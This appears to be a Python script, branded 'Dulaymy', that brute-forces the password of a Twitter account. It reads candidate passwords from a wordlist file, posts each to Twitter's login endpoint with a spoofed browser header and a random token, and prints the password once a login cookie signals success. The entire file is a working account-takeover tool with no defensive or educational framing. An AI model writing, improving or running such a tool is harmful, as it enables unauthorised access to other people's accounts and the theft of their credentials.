import requests
import random 
import json
import time
from bs4 import BeautifulSoup
import pyfiglet



# = = = = = = = = = = = = 

R = '\033[1;31m' #احمر
X = '\033[1;33m' #اصفر
Z1 = '\033[2;31m' #احمر ثاني
G= '\033[2;32m' #اخضر
A = '\033[2;34m'#ازرق
C = '\033[2;35m' #وردي
B = '\033[2;36m'#سمائي
Y = '\033[1;34m' #ازرق فاتح

# = = = = = = = = = = = =
time.sleep(0)
logo = pyfiglet.figlet_format('Dulaymy')
print(B+logo)
print(R+'* '*15+A)


Words = ['q', 'w', 'e', 'r', 't', 'y', 'u', 'i', 'o', 'p', 'a', 's', 'd', 'f', 'g', 'h', 'j', 'k', 'l', 'z', 'x', 'c', 'v', 'b', 'n', 'm', '1', '2', '3', '4', '5', '6', '7', '8', '9', '0', 'q', 'w', 'e', 'r', 't', 'y', 'u', 'i', 'o', 'p', 'a', 's', 'd', 'f', 'g', 'h', 'j', 'k', 'l', 'z', 'x', 'c', 'v', 'b', 'n', 'm']
token = (random.choice(Words)+random.choice(Words)+random.choice(Words)+random.choice(Words)+random.choice(Words)+random.choice(Words)+random.choice(Words)+random.choice(Words)+random.choice(Words)+random.choice(Words)+random.choice(Words)+random.choice(Words)+random.choice(Words)+random.choice(Words)+random.choice(Words)+random.choice(Words)+random.choice(Words)+random.choice(Words)+random.choice(Words)+random.choice(Words)+random.choice(Words)+random.choice(Words)+random.choice(Words))
ct0 = ''
auth_token = ''
tweets = open('pass.txt', 'r', encoding='utf-8')

	
username = input(str("Enter username : "))
#password = input(str("Enter password : "))


		
times =5 # int(input("Tweet every (Seconds) : "))
updatecook =50 #int(input("cookies update  after ( ? ) tweets : "))


def login():
	session = requests.Session()
	url = "https://twitter.com/sessions"
	session.headers = {
	"Host": "twitter.com",
	"Content-Type": "application/x-www-form-urlencoded",
	"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.193 Safari/537.36",
	"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9"
	}
	cookies = {
	"_mb_tk":token
	}
	data = {
	"authenticity_token":token,
	"session[username_or_email]":username,
	"session[password]":password
	}
	response = session.post(url, data=data , cookies=cookies)
	r = session.cookies.get_dict()
	return (r['dnt'])

while True:
	password = tweets.readline().split('\n')[0]
	try:
		if(login() == '1'):
			print(Y+"Password is : "+G+password)
			break
	except:
		print(R+password)